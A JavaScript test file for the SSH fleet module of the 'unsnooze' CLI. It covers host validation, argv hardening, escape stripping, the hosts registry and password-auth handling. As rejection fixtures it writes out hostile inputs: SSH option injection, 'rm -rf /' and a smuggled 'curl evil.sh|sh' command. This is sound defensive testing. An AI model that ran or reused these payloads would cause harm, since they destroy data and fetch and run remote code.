// Fleet primitives: host validation, ssh argv hardening, framing, sanitization.
import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, rmSync, writeFileSync, mkdirSync, chmodSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { EventEmitter } from 'node:events';

const DIR = mkdtempSync(join(tmpdir(), 'unsnooze-fleet-test-'));
process.env.UNSNOOZE_STATE_DIR = DIR;

after(() => {
  rmSync(DIR, { recursive: true, force: true });
});

const {
  validHostToken, sshArgs, frameEnvelope, extractEnvelope,
  stripRemoteText, validateEnvelope, SCHEMA, KEY_RE, BEGIN, END,
} = await import('../src/fleet.js');
const frameIt = frameEnvelope;
const S = SCHEMA;

test('validHostToken: ssh aliases yes, option-injection and metachars no', () => {
  for (const ok of ['build1', 'user@10.0.0.5', 'vpc-a.internal', 'dev_box.example.com']) {
    assert.equal(validHostToken(ok), true, ok);
  }
  for (const bad of ['-oProxyCommand=evil', '--fake', 'host name', 'a;rm -rf /', 'h`x`', '$(x)', '', 'a\nb']) {
    assert.equal(validHostToken(bad), false, JSON.stringify(bad));
  }
});

test('sshArgs: hardening flags fixed, in order, before the host; never StrictHostKeyChecking', () => {
  const args = sshArgs('build1', ['status']);
  const hostIdx = args.indexOf('build1');
  assert.ok(hostIdx > 0, 'host present');
  const flags = args.slice(0, hostIdx).join(' ');
  assert.match(flags, /BatchMode=yes/);
  assert.match(flags, /ConnectTimeout=5/);
  assert.match(flags, /ControlMaster=auto/);
  assert.match(flags, /ControlPersist=60s/);
  assert.ok(args.includes('-T'), 'no TTY on data calls');
  assert.ok(!flags.includes('StrictHostKeyChecking'), 'never touches host-key policy');
  // remote command rides after the host as a single argv tail
  assert.deepEqual(args.slice(hostIdx + 1), ['unsnooze', '_remote', 'status']);
  assert.throws(() => sshArgs('-oProxyCommand=evil', ['status']), /invalid host/);
  assert.throws(() => sshArgs('build1', ['resume', 'bad;key']), /invalid remote arg/);
});

test('frame/extract round-trips and survives motd noise; garbage → null', () => {
  const framed = frameEnvelope({ schema: SCHEMA, hello: 1 });
  assert.equal(extractEnvelope('Welcome to Ubuntu!\n' + framed + '\ntrailing rc noise').hello, 1);
  assert.equal(extractEnvelope('no frame here'), null);
  assert.equal(extractEnvelope('___UNSNOOZE_BEGIN___{broken json___UNSNOOZE_END___'), null);
});

test('stripRemoteText: kills CSI/OSC/C0/C1 and caps length', () => {
  assert.equal(stripRemoteText('\x1b[31mred\x1b[0m'), 'red');
  assert.equal(stripRemoteText('\x1b]0;title\x07cwd'), 'cwd');            // OSC + BEL
  assert.equal(stripRemoteText('\x1b]8;;http://x\x1b\\link\x1b]8;;\x1b\\'), 'link'); // OSC 8 + ST
  assert.equal(stripRemoteText('a\x9bXb'), 'ab');                          // C1 CSI
  assert.equal(stripRemoteText('a\x07\x08b'), 'ab');                       // bare C0
  assert.equal(stripRemoteText('x'.repeat(500), 100).length, 100);
  assert.equal(stripRemoteText(null), '');
});

test('stripRemoteText: strips TAB/LF/CR too, so a field cannot inject fake table rows', () => {
  const out = stripRemoteText('line1\nfake ● online\tcol');
  assert.ok(!out.includes('\n'), 'no newline survives');
  assert.ok(!out.includes('\t'), 'no tab survives');
  assert.ok(!out.includes('\r'), 'no CR survives');
  assert.equal(out, 'line1fake ● onlinecol');
});

test('validateEnvelope: schema window, skew detected, junk rejected', () => {
  const good = { schema: 1, minSchema: 1, cli: '1.13.0', host: 'build1', caps: [], sessions: [] };
  assert.equal(validateEnvelope(good).ok, true);
  assert.equal(validateEnvelope({ schema: 99, minSchema: 99 }).ok, false);
  assert.match(validateEnvelope({ schema: 99, minSchema: 99 }).reason, /skew/);
  assert.equal(validateEnvelope(null).ok, false);
  assert.equal(validateEnvelope({ schema: 'x' }).ok, false);
});

test('KEY_RE accepts real session keys, rejects shell metachars', () => {
  assert.match('92d6f63d-5374-4efc-8181-3218435612d2', KEY_RE);
  assert.match('pane:abc123:1784200000000', KEY_RE);
  assert.doesNotMatch('key;rm -rf', KEY_RE);
  assert.doesNotMatch('a b', KEY_RE);
});

test('hosts registry: add/list/rm round-trip, atomic file, invalid rejected', async () => {
  const { readHosts, writeHosts, cmdHosts } = await import('../src/fleet.js');
  assert.deepEqual({ ...readHosts() }, {});
  assert.equal(await cmdHosts(['add', 'build1']), 0);                    // dest defaults to name
  assert.equal(await cmdHosts(['add', 'gpu', 'ubuntu@10.0.0.7']), 0);
  assert.deepEqual({ ...readHosts() }, {
    build1: { dest: 'build1', auth: 'key' },
    gpu: { dest: 'ubuntu@10.0.0.7', auth: 'key' },
  });
  assert.equal(await cmdHosts(['add', 'bad', '-oProxyCommand=x']), 1);  // invalid dest
  assert.equal(await cmdHosts(['rm', 'build1']), 0);
  assert.deepEqual(Object.keys(readHosts()), ['gpu']);
  assert.equal(await cmdHosts(['rm', 'nope']), 1);
  assert.equal(await cmdHosts(['list']), 0);
  assert.equal(await cmdHosts(['frobnicate']), 2);                       // usage
});

test('readHosts: migrates string entries to key-auth descriptors', async () => {
  const { writeHosts, readHosts } = await import('../src/fleet.js');
  writeHosts({ vpc: 'ubuntu@10.0.0.7' });                       // legacy string on disk
  const h = readHosts();
  assert.deepEqual({ ...h.vpc }, { dest: 'ubuntu@10.0.0.7', auth: 'key' });
});

test('hosts add --auth password --source command stores a descriptor', async () => {
  const { cmdHosts, readHosts } = await import('../src/fleet.js');
  assert.equal(await cmdHosts(['add', 'ci', 'ci@build', '--auth', 'password',
    '--source', 'command', '--cmd', 'op read op://v/ci/pw']), 0);
  const e = readHosts().ci;
  assert.equal(e.auth, 'password');
  assert.equal(e.source, 'command');
  assert.equal(e.cmd, 'op read op://v/ci/pw');
});

test('hosts add: password defaults to prompt source; bad source/auth rejected', async () => {
  const { cmdHosts, readHosts } = await import('../src/fleet.js');
  assert.equal(await cmdHosts(['add', 'lap', 'me@lap', '--auth', 'password']), 0);
  assert.equal(readHosts().lap.source, 'prompt');
  assert.equal(await cmdHosts(['add', 'x', 'x@x', '--auth', 'nope']), 1);
  assert.equal(await cmdHosts(['add', 'y', 'y@y', '--auth', 'password', '--source', 'bogus']), 1);
  // command source requires --cmd; env requires --env
  assert.equal(await cmdHosts(['add', 'z', 'z@z', '--auth', 'password', '--source', 'command']), 1);
});

test('hosts add: --source env requires a valid --env name', async () => {
  const { cmdHosts, readHosts } = await import('../src/fleet.js');
  assert.equal(await cmdHosts(['add', 'e1', 'e1@e1', '--auth', 'password',
    '--source', 'env', '--env', 'bad name!']), 1);                       // invalid identifier
  assert.equal(await cmdHosts(['add', 'e2', 'e2@e2', '--auth', 'password',
    '--source', 'env', '--env', 'UNSNOOZE_PW_E2']), 0);
  assert.equal(readHosts().e2.env, 'UNSNOOZE_PW_E2');
  assert.equal(await cmdHosts(['add', 'e3', 'e3@e3', '--auth', 'password', '--source', 'env']), 0);
  assert.match(readHosts().e3.env, /^UNSNOOZE_PW_E3$/);                  // auto-generated default
});

test('hosts add: --source keychain defaults service/account from name/dest', async () => {
  const { cmdHosts, readHosts } = await import('../src/fleet.js');
  assert.equal(await cmdHosts(['add', 'kc', 'alice@box', '--auth', 'password', '--source', 'keychain']), 0);
  const e = readHosts().kc;
  assert.equal(e.service, 'unsnooze-kc');
  assert.equal(e.account, 'alice');
  assert.equal(await cmdHosts(['add', 'kc2', 'bob@box2', '--auth', 'password', '--source', 'keychain',
    '--service', 'svc', '--account', 'acct']), 0);
  assert.equal(readHosts().kc2.service, 'svc');
  assert.equal(readHosts().kc2.account, 'acct');
});

test('key host still writes/reads as before (regression)', async () => {
  const { cmdHosts, readHosts } = await import('../src/fleet.js');
  assert.equal(await cmdHosts(['add', 'vpc2', 'ubuntu@vpc2']), 0);
  assert.equal(readHosts().vpc2.auth, 'key');
  assert.equal(readHosts().vpc2.dest, 'ubuntu@vpc2');
});

test('writeHosts round-trip: key host serializes as bare string, password host as descriptor', async () => {
  const { cmdHosts, readHosts } = await import('../src/fleet.js');
  const { readFileSync } = await import('node:fs');
  const { STATE_DIR } = await import('../src/config.js');
  const { join: pathJoin } = await import('node:path');
  assert.equal(await cmdHosts(['add', 'plain', 'ubuntu@plain']), 0);
  assert.equal(await cmdHosts(['add', 'secure', 'sec@box', '--auth', 'password']), 0);
  const onDisk = JSON.parse(readFileSync(pathJoin(STATE_DIR, 'hosts.json'), 'utf-8'));
  assert.equal(typeof onDisk.plain, 'string', 'key host stays diff-friendly bare string on disk');
  assert.equal(onDisk.plain, 'ubuntu@plain');
  assert.equal(typeof onDisk.secure, 'object');
  assert.equal(onDisk.secure.auth, 'password');
  // and it still reads back correctly through the normalizer
  assert.equal(readHosts().plain.dest, 'ubuntu@plain');
  assert.equal(readHosts().plain.auth, 'key');
  assert.equal(readHosts().secure.auth, 'password');
});

test('status --json prints machine shape; resume core marks without typing', async () => {
  const { execFileSync } = await import('node:child_process');
  const home = mkdtempSync(join(tmpdir(), 'unsnooze-fleet-e2e-'));
  const stateDir = join(home, '.unsnooze');
  mkdirSync(stateDir, { recursive: true });
  writeFileSync(join(stateDir, 'state.json'), JSON.stringify({
    version: 1, sessions: {
      'aaaa1111-2222-3333-4444-555566667777': {
        key: 'aaaa1111-2222-3333-4444-555566667777',
        sessionId: 'aaaa1111-2222-3333-4444-555566667777',
        agent: 'claude', cwd: '/tmp/p', status: 'stopped',
        resetAt: Date.now() + 3_600_000, resetSource: 'absolute',
        mux: 'tmux', pane: '%1', muxSession: 'unsnooze', attempts: 0,
        limitType: '5h', detectedAt: Date.now(),
      },
    },
  }));
  const env = { ...process.env, UNSNOOZE_STATE_DIR: stateDir, NO_COLOR: '1' };
  const out = execFileSync(process.execPath, ['bin/unsnooze.js', 'status', '--json'], { env, encoding: 'utf-8' });
  const j = JSON.parse(out);
  assert.equal(j.version, 1);
  assert.equal(j.sessions.length, 1);
  assert.equal(j.sessions[0].agent, 'claude');
  assert.equal(j.sessions[0].status, 'stopped');
  rmSync(home, { recursive: true, force: true });
});

// ---------------------------------------------------------------------------
// ssh fan-out, cache, `unsnooze fleet`
// ---------------------------------------------------------------------------

function fakeSsh({ code = 0, stdout = '', stderr = '', delayMs = 5 }) {
  return () => {
    const p = new EventEmitter();
    p.stdout = new EventEmitter();
    p.stderr = new EventEmitter();
    p.kill = () => { p.killed = true; p.emit('close', null, 'SIGKILL'); };
    setTimeout(() => {
      if (stdout) p.stdout.emit('data', Buffer.from(stdout));
      if (stderr) p.stderr.emit('data', Buffer.from(stderr));
      p.emit('close', code);
    }, delayMs);
    return p;
  };
}

const GOOD = frameIt({
  schema: S, minSchema: 1, cli: '9.9.9', host: 'build1', caps: ['resume', 'cancel'],
  sessions: [{ key: 'k1', agent: 'claude', status: 'stopped', cwd: '/tmp\x1b[31mX', resetAt: Date.now() + 60_000, mux: 'tmux', muxSession: 'unsnooze' }],
});
const fakeSshOk = fakeSsh({ stdout: GOOD });

test('fetchHost: online with sanitized fields; motd noise tolerated', async () => {
  const { fetchHost } = await import('../src/fleet.js');
  const r = await fetchHost('build1', 'build1', { spawnFn: fakeSsh({ stdout: 'motd!\n' + GOOD + '\n' }) });
  assert.equal(r.state, 'online');
  assert.equal(r.envelope.sessions[0].cwd, '/tmpX');        // CSI stripped on ingest
  assert.equal(r.envelope.sessions[0].key, 'k1');
});

test('fetchHost: exit 255 → unreachable; garbage → error; skew detected', async () => {
  const { fetchHost } = await import('../src/fleet.js');
  assert.equal((await fetchHost('h', 'h', { spawnFn: fakeSsh({ code: 255 }) })).state, 'unreachable');
  assert.equal((await fetchHost('h', 'h', { spawnFn: fakeSsh({ stdout: 'not json' }) })).state, 'error');
  const skew = frameIt({ schema: 99, minSchema: 99, cli: '9.9.9', host: 'h', caps: [], sessions: [] });
  assert.equal((await fetchHost('h', 'h', { spawnFn: fakeSsh({ stdout: skew }) })).state, 'skew');
});

test('fetchHost: timeout kills and reports unreachable', async () => {
  const { fetchHost } = await import('../src/fleet.js');
  const r = await fetchHost('h', 'h', { spawnFn: fakeSsh({ delayMs: 5_000 }), timeoutMs: 50 });
  assert.equal(r.state, 'unreachable');
  assert.match(r.error, /timeout/);
});

test('fetchFleet: dead host does not block others; stale cache is used', async () => {
  const { fetchFleet, writeFleetCache } = await import('../src/fleet.js');
  writeFleetCache([{ host: 'dead', state: 'online', at: Date.now() - 60_000, envelope: JSON.parse(GOOD.slice('___UNSNOOZE_BEGIN___'.length, -'___UNSNOOZE_END___'.length)) }]);
  const spawns = { good: fakeSsh({ stdout: GOOD }), dead: fakeSsh({ code: 255 }) };
  const results = await fetchFleet({
    hosts: { good: 'good', dead: 'dead' },
    spawnFn: (cmd, args) => spawns[args[args.indexOf('-T') + 1]](),
  });
  const dead = results.find(r => r.host === 'dead');
  assert.equal(dead.state, 'stale');                        // cached data survives
  assert.ok(dead.cachedAt);
  assert.equal(results.find(r => r.host === 'good').state, 'online');
});

test('attachHintRemote wraps the local hint in ssh -t', async () => {
  const { attachHintRemote } = await import('../src/fleet.js');
  assert.equal(attachHintRemote('gpu', 'tmux', 'unsnooze'), `ssh -t gpu 'tmux new -A -s unsnooze'`);
  assert.equal(attachHintRemote('gpu', 'zellij', 'unsnooze'), `ssh -t gpu 'zellij attach unsnooze'`);
});

test('attachHintRemote: hostile muxSession (shell metachars) yields no hint at all', async () => {
  const { attachHintRemote } = await import('../src/fleet.js');
  assert.equal(attachHintRemote('gpu', 'tmux', "x'; curl evil.sh|sh; echo '"), null);
  assert.equal(attachHintRemote('gpu', 'tmux', 'a; rm -rf /'), null);
  assert.equal(attachHintRemote('gpu', 'tmux', 'a b'), null);
  assert.equal(attachHintRemote('gpu', 'tmux', ''), null);
  assert.equal(attachHintRemote('gpu', 'tmux', undefined), null);
});

test('attachHintRemote: hostile dest also yields no hint', async () => {
  const { attachHintRemote } = await import('../src/fleet.js');
  assert.equal(attachHintRemote('-oProxyCommand=evil', 'tmux', 'unsnooze'), null);
  assert.equal(attachHintRemote('a;rm -rf /', 'tmux', 'unsnooze'), null);
});

test('attachHintRemote: a clean muxSession still round-trips', async () => {
  const { attachHintRemote } = await import('../src/fleet.js');
  assert.equal(attachHintRemote('build1', 'zellij', 'my-session.1_2'), `ssh -t build1 'zellij attach my-session.1_2'`);
});

test('fleet table/json path: hostile muxSession produces no attach line', async () => {
  const { fetchFleet, formatFleetTui } = await import('../src/fleet.js');
  const evilSession = frameIt({
    schema: S, minSchema: 1, cli: '9.9.9', host: 'evil', caps: [],
    sessions: [{
      key: 'k1', agent: 'claude', status: 'stopped',
      cwd: '/tmp', resetAt: Date.now() + 60_000, mux: 'tmux',
      muxSession: "x'; curl evil.sh|sh; echo '",
    }],
  });
  const results = await fetchFleet({
    hosts: { evil: 'evil' },
    spawnFn: fakeSsh({ stdout: evilSession }),
  });
  // The rendered table (what `unsnooze fleet` and `--json` consumers act on
  // for display) must never emit an attach hint built from the hostile
  // muxSession, since that hint is meant to be pasted into a shell.
  const tui = formatFleetTui(results, { color: false, hosts: { evil: 'evil' } });
  assert.doesNotMatch(tui, /attach:/);
  assert.doesNotMatch(tui, /curl evil\.sh/);
});

test('collectChild timeout is self-contained (not unref\'d) so safety net always works', async () => {
  const { fetchHost } = await import('../src/fleet.js');
  // Test that a timeout still kills the process even without external keep-alive
  const slow = () => {
    const p = new EventEmitter();
    p.stdout = new EventEmitter();
    p.stderr = new EventEmitter();
    p.kill = () => { p.killed = true; p.emit('close', null, 'SIGKILL'); };
    // Never emit close, simulating a hung process
    setTimeout(() => {
      if (!p.killed) p.emit('close', 0); // only close if not killed
    }, 10_000);
    return p;
  };
  const r = await fetchHost('h', 'h', { spawnFn: slow, timeoutMs: 50 });
  assert.equal(r.state, 'unreachable');
  assert.match(r.error, /timeout/);
});

test('fetchHost with prompt close does not delay due to cleared timeout', async () => {
  const { fetchHost } = await import('../src/fleet.js');
  const start = Date.now();
  const r = await fetchHost('h', 'h', { spawnFn: fakeSsh({ stdout: GOOD, delayMs: 5 }), timeoutMs: 5_000 });
  const elapsed = Date.now() - start;
  assert.equal(r.state, 'online');
  // Should resolve quickly (within ~100ms), not wait for the 5s timeout
  assert.ok(elapsed < 500, `should resolve promptly, took ${elapsed}ms`);
});

test('fetchFleet re-sanitizes cached envelope to strip injected escapes', async () => {
  const { fetchFleet, writeFleetCache, sanitizeEnvelope } = await import('../src/fleet.js');
  // Write a tampered cache entry with ESC in cwd
  const evilEnvelope = {
    schema: S, minSchema: 1, cli: '9.9.9', host: 'evil', caps: [],
    sessions: [{ key: 'k1', agent: 'claude', status: 'stopped', cwd: '/tmp/\x1b]0;x\x07evil', resetAt: Date.now() + 60_000, mux: 'tmux', muxSession: 'unsnooze' }],
  };
  writeFleetCache([{ host: 'evil', state: 'online', at: Date.now() - 60_000, envelope: evilEnvelope }]);

  // Force stale path: host unreachable (exit 255), cache is <24h old
  const spawns = { evil: fakeSsh({ code: 255 }) };
  const results = await fetchFleet({
    hosts: { evil: 'evil' },
    spawnFn: (cmd, args) => spawns[args[args.indexOf('-T') + 1]](),
  });

  const evil = results.find(r => r.host === 'evil');
  assert.equal(evil.state, 'stale');
  // Envelope should be re-sanitized: ESC stripped from cwd
  assert.equal(evil.envelope.sessions[0].cwd, '/tmp/evil');
});

// ---------------------------------------------------------------------------
// Password auth wiring: auth-aware sshArgs, sshEnvForHost, fetchHost composition
// ---------------------------------------------------------------------------

test('sshArgs: multiplex:false omits ControlMaster (native windows)', () => {
  const on = sshArgs('h', ['status'], { multiplex: true }).join(' ');
  const off = sshArgs('h', ['status'], { multiplex: false }).join(' ');
  assert.match(on, /ControlMaster=auto/);
  assert.doesNotMatch(off, /ControlMaster/);
  assert.doesNotMatch(off, /ControlPersist/);
});

test('sshArgs: batch:false omits BatchMode=yes (interactive prompt host)', () => {
  const on = sshArgs('h', ['status'], { batch: true }).join(' ');
  const off = sshArgs('h', ['status'], { batch: false }).join(' ');
  assert.match(on, /BatchMode=yes/);
  assert.doesNotMatch(off, /BatchMode/);
});

test('sshEnvForHost: password host gets SSH_ASKPASS env, key host gets none, secret never in argv', async () => {
  const { sshEnvForHost } = await import('../src/fleet.js');
  const ssh = { bin: 'ssh', askpass: true, multiplex: true, flavor: 'unix' };
  const pw = sshEnvForHost({ name: 'gpu', dest: 'me@gpu', auth: 'password', source: 'command', cmd: 'op read x' },
    { ssh, helperPath: '/s/askpass.sh', interactive: false });
  assert.equal(pw.env.SSH_ASKPASS, '/s/askpass.sh');
  assert.equal(pw.env.SSH_ASKPASS_REQUIRE, 'force');
  assert.equal(pw.env.UNSNOOZE_ASKPASS_HOST, 'gpu');

  const key = sshEnvForHost({ name: 'v', dest: 'u@v', auth: 'key' }, { ssh, helperPath: '/x', interactive: false });
  assert.deepEqual(key.env, {});

  // ssh < 8.4 → needs-auth, no askpass env
  const old = sshEnvForHost({ name: 'g', dest: 'm@g', auth: 'password', source: 'env', env: 'PW' },
    { ssh: { ...ssh, askpass: false }, helperPath: '/x', interactive: false });
  assert.equal(old.needsAuth, true);
  assert.deepEqual(old.env, {});
});

test('sshEnvForHost: interactive prompt source lets ssh prompt directly (no askpass, no BatchMode); daemon prompt needs auth', async () => {
  const { sshEnvForHost } = await import('../src/fleet.js');
  const ssh = { bin: 'ssh', askpass: true, multiplex: true, flavor: 'unix' };
  const entry = { name: 'lap', dest: 'me@lap', auth: 'password', source: 'prompt' };
  const interactiveResult = sshEnvForHost(entry, { ssh, helperPath: '/x', interactive: true });
  assert.deepEqual(interactiveResult.env, {});
  assert.equal(interactiveResult.batch, false);
  assert.ok(!interactiveResult.needsAuth);

  const daemonResult = sshEnvForHost(entry, { ssh, helperPath: '/x', interactive: false });
  assert.equal(daemonResult.needsAuth, true);
  assert.deepEqual(daemonResult.env, {});
});

test('fetchHost: password host spawns detected ssh with askpass env; password never in args', async () => {
  const { fetchHost } = await import('../src/fleet.js');
  let seen;
  const spawnFn = (bin, args, opts) => { seen = { bin, args, opts }; return fakeSshOk(); };
  await fetchHost('gpu', { dest: 'me@gpu', auth: 'password', source: 'command', cmd: 'op read x' },
    { spawnFn, detect: () => ({ bin: 'ssh', askpass: true, multiplex: true, flavor: 'unix' }), timeoutMs: 200 });
  assert.equal(seen.bin, 'ssh');
  assert.equal(seen.opts.env.SSH_ASKPASS_REQUIRE, 'force');
  assert.equal(seen.opts.env.UNSNOOZE_ASKPASS_HOST, 'gpu');
  assert.ok(!JSON.stringify(seen.args).includes('op read'));    // cmd/secret never on argv
  assert.ok(!JSON.stringify(seen.args).includes('SSH_ASKPASS')); // askpass rides env only
});

test('fetchHost: key host regression — empty env, multiplex/batch from detect, unchanged args shape', async () => {
  const { fetchHost } = await import('../src/fleet.js');
  let seen;
  const spawnFn = (bin, args, opts) => { seen = { bin, args, opts }; return fakeSshOk(); };
  await fetchHost('build1', { dest: 'build1', auth: 'key' },
    { spawnFn, detect: () => ({ bin: 'ssh', askpass: true, multiplex: true, flavor: 'unix' }), timeoutMs: 200 });
  assert.equal(seen.bin, 'ssh');
  assert.equal(seen.opts.env.SSH_ASKPASS, undefined);
  assert.equal(seen.opts.env.UNSNOOZE_ASKPASS_HOST, undefined);
  const flags = seen.args.slice(0, seen.args.indexOf('build1')).join(' ');
  assert.match(flags, /BatchMode=yes/);
  assert.match(flags, /ControlMaster=auto/);
});

test('fetchHost: bare dest string still works (legacy shorthand, key auth)', async () => {
  const { fetchHost } = await import('../src/fleet.js');
  const r = await fetchHost('build1', 'build1', { spawnFn: fakeSsh({ stdout: GOOD }) });
  assert.equal(r.state, 'online');
});

test('fetchHost: native-windows flavor (multiplex:false) omits ControlMaster from the real spawn', async () => {
  const { fetchHost } = await import('../src/fleet.js');
  let seen;
  const spawnFn = (bin, args, opts) => { seen = { bin, args, opts }; return fakeSshOk(); };
  await fetchHost('winbox', { dest: 'me@winbox', auth: 'key' },
    { spawnFn, detect: () => ({ bin: 'C:\\ssh.exe', askpass: true, multiplex: false, flavor: 'native-windows' }), timeoutMs: 200 });
  assert.equal(seen.bin, 'C:\\ssh.exe');
  assert.doesNotMatch(seen.args.join(' '), /ControlMaster/);
});

test('remoteAction: password host askpass env present; secret/cmd never in argv', async () => {
  const { remoteAction } = await import('../src/fleet.js');
  let seen;
  const spawnFn = (bin, args, opts) => {
    seen = { bin, args, opts };
    return fakeSsh({ stdout: frameEnvelope({ schema: S, minSchema: 1, result: 'ok' }) })();
  };
  const res = await remoteAction('gpu', { dest: 'me@gpu', auth: 'password', source: 'command', cmd: 'op read x' },
    'resume', 'k1', { spawnFn, detect: () => ({ bin: 'ssh', askpass: true, multiplex: true, flavor: 'unix' }), timeoutMs: 200 });
  assert.equal(res.ok, true);
  assert.equal(seen.opts.env.SSH_ASKPASS_REQUIRE, 'force');
  assert.equal(seen.opts.env.UNSNOOZE_ASKPASS_HOST, 'gpu');
  assert.ok(!JSON.stringify(seen.args).includes('op read'));
});

// ---------------------------------------------------------------------------
// Task 6: needs-auth surfacing, hosts test, interactive wiring
// ---------------------------------------------------------------------------

test('fetchHost: sshEnvForHost needsAuth short-circuits to needs-auth (no ssh spawn)', async () => {
  const { fetchHost } = await import('../src/fleet.js');
  let spawned = false;
  const spawnFn = () => { spawned = true; return fakeSshOk(); };
  // A `prompt` source with no interactive terminal (the daemon path) has
  // nothing to prompt from — sshEnvForHost marks it needsAuth up front.
  const r = await fetchHost('lap', { dest: 'me@lap', auth: 'password', source: 'prompt' },
    { spawnFn, interactive: false });
  assert.equal(r.state, 'needs-auth');
  assert.equal(spawned, false, 'ssh must never spawn when there is no resolvable credential');
});

test('fetchHost: ssh exit 255 with auth-failure stderr on a password host → needs-auth; key host stays unreachable', async () => {
  const { fetchHost } = await import('../src/fleet.js');
  const denied = fakeSsh({ code: 255, stderr: 'Permission denied (publickey,password).\n' });
  const pwResult = await fetchHost('gpu', { dest: 'me@gpu', auth: 'password', source: 'command', cmd: 'op read x' },
    { spawnFn: denied, detect: () => ({ bin: 'ssh', askpass: true, multiplex: true, flavor: 'unix' }), timeoutMs: 200 });
  assert.equal(pwResult.state, 'needs-auth');

  // A key host getting the exact same stderr is a genuine key problem, not
  // an auth-source issue — it must stay unreachable, never needs-auth.
  const keyResult = await fetchHost('build1', { dest: 'build1', auth: 'key' },
    { spawnFn: fakeSsh({ code: 255, stderr: 'Permission denied (publickey).\n' }), timeoutMs: 200 });
  assert.equal(keyResult.state, 'unreachable');
});

test('remoteAction: needsAuth short-circuit and auth-failure stderr classification mirror fetchHost', async () => {
  const { remoteAction } = await import('../src/fleet.js');
  let spawned = false;
  const shortCircuited = await remoteAction('lap', { dest: 'me@lap', auth: 'password', source: 'prompt' },
    'resume', 'k1', { spawnFn: () => { spawned = true; return fakeSshOk(); }, interactive: false });
  assert.equal(shortCircuited.ok, false);
  assert.equal(shortCircuited.needsAuth, true);
  assert.equal(spawned, false);

  const denied = fakeSsh({ code: 255, stderr: 'Permission denied (password).\n' });
  const pw = await remoteAction('gpu', { dest: 'me@gpu', auth: 'password', source: 'command', cmd: 'op read x' },
    'resume', 'k1', { spawnFn: denied, detect: () => ({ bin: 'ssh', askpass: true, multiplex: true, flavor: 'unix' }), timeoutMs: 200 });
  assert.equal(pw.ok, false);
  assert.equal(pw.needsAuth, true);

  const key = await remoteAction('build1', { dest: 'build1', auth: 'key' }, 'resume', 'k1',
    { spawnFn: fakeSsh({ code: 255, stderr: 'Permission denied (publickey).\n' }), timeoutMs: 200 });
  assert.equal(key.ok, false);
  assert.ok(!key.needsAuth);
});

test('formatFleetTui: needs-auth renders a distinct glyph from unreachable', async () => {
  const { formatFleetTui } = await import('../src/fleet.js');
  const results = [
    { host: 'lap', state: 'needs-auth', at: Date.now(), error: 'no resolvable credential' },
    { host: 'dead', state: 'unreachable', at: Date.now(), error: 'timeout' },
  ];
  const out = formatFleetTui(results, { color: false, hosts: {} });
  assert.match(out, /◐ needs-auth/);
  assert.match(out, /✗ unreachable/);
});

test('fetchFleet threads interactive through to fetchHost/sshEnvForHost: interactive+prompt host reaches the ssh-prompts path, non-interactive gets needs-auth', async () => {
  const { fetchFleet } = await import('../src/fleet.js');
  const hosts = { lap: { dest: 'me@lap', auth: 'password', source: 'prompt' } };

  // interactive:true → sshEnvForHost returns batch:false (no BatchMode=yes)
  // and ssh is actually spawned to prompt on the console — the previously
  // dead interactive branch is now reachable end to end.
  let seenArgs;
  const spawnFn = (bin, args) => { seenArgs = args; return fakeSsh({ stdout: GOOD })(); };
  const interactiveResults = await fetchFleet({ hosts, spawnFn, interactive: true, timeoutMs: 200 });
  assert.equal(interactiveResults[0].state, 'online');
  assert.ok(seenArgs, 'ssh must be spawned for the interactive prompt path');
  assert.doesNotMatch(seenArgs.join(' '), /BatchMode/);

  // interactive:false (the daemon/default) → needsAuth short-circuit,
  // ssh never spawned, state is needs-auth.
  seenArgs = undefined;
  const daemonResults = await fetchFleet({ hosts, spawnFn, interactive: false, timeoutMs: 200 });
  assert.equal(daemonResults[0].state, 'needs-auth');
  assert.equal(seenArgs, undefined, 'ssh must never spawn without a resolvable credential');
});

test('cmdHosts test: env source resolves ok when var set → auth ok, secret never printed', async () => {
  const { cmdHosts, writeHosts } = await import('../src/fleet.js');
  writeHosts({ envhost: { dest: 'me@envhost', auth: 'password', source: 'env', env: 'UNSNOOZE_TEST_PW' } });
  process.env.UNSNOOZE_TEST_PW = 'tdd-super-secret-value';
  const logs = [];
  const origLog = console.log;
  console.log = (...a) => logs.push(a.join(' '));
  let code;
  try {
    code = await cmdHosts(['test', 'envhost'], { spawnFn: fakeSshOk, timeoutMs: 200 });
  } finally {
    console.log = origLog;
    delete process.env.UNSNOOZE_TEST_PW;
  }
  const out = logs.join('\n');
  assert.equal(code, 0);
  assert.match(out, /auth: source resolved ok/);
  assert.match(out, /auth ok/);
  assert.ok(!out.includes('tdd-super-secret-value'), 'secret value must never appear in output');
});

test('cmdHosts test: env source unset → clear message, needs-setup, no network probe, secret absent', async () => {
  const { cmdHosts, writeHosts } = await import('../src/fleet.js');
  writeHosts({ envhost2: { dest: 'me@envhost2', auth: 'password', source: 'env', env: 'UNSNOOZE_TEST_PW2' } });
  delete process.env.UNSNOOZE_TEST_PW2;
  const logs = [];
  const origLog = console.log;
  console.log = (...a) => logs.push(a.join(' '));
  let spawned = false;
  let code;
  try {
    code = await cmdHosts(['test', 'envhost2'], { spawnFn: () => { spawned = true; return fakeSshOk(); }, timeoutMs: 200 });
  } finally {
    console.log = origLog;
  }
  const out = logs.join('\n');
  assert.equal(code, 1);
  assert.match(out, /auth: .*not set/);
  assert.match(out, /needs-setup/);
  assert.ok(!/UNSNOOZE_TEST_PW2=/.test(out));
  assert.equal(spawned, false, 'no point probing ssh when the credential could not resolve');
});

test('cmdHosts test: key host runs a real reachability probe and prints key ok / needs-setup', async () => {
  const { cmdHosts, writeHosts } = await import('../src/fleet.js');
  writeHosts({ keyhost: 'ubuntu@keyhost' });
  const logs = [];
  const origLog = console.log;
  console.log = (...a) => logs.push(a.join(' '));
  let code;
  try {
    code = await cmdHosts(['test', 'keyhost'], { spawnFn: fakeSshOk, timeoutMs: 200 });
  } finally {
    console.log = origLog;
  }
  assert.equal(code, 0);
  assert.match(logs.join('\n'), /key ok/);

  logs.length = 0;
  console.log = (...a) => logs.push(a.join(' '));
  try {
    code = await cmdHosts(['test', 'keyhost'], { spawnFn: fakeSsh({ code: 255 }), timeoutMs: 200 });
  } finally {
    console.log = origLog;
  }
  assert.equal(code, 1);
  assert.match(logs.join('\n'), /needs-setup/);
});

test('cmdHosts test: unknown host and missing name are rejected cleanly', async () => {
  const { cmdHosts } = await import('../src/fleet.js');
  assert.equal(await cmdHosts(['test', 'nope-not-registered']), 1);
  assert.equal(await cmdHosts(['test']), 2);
});

// ---------------------------------------------------------------------------
// C1 (CRITICAL): a stored password source must NOT run with BatchMode=yes —
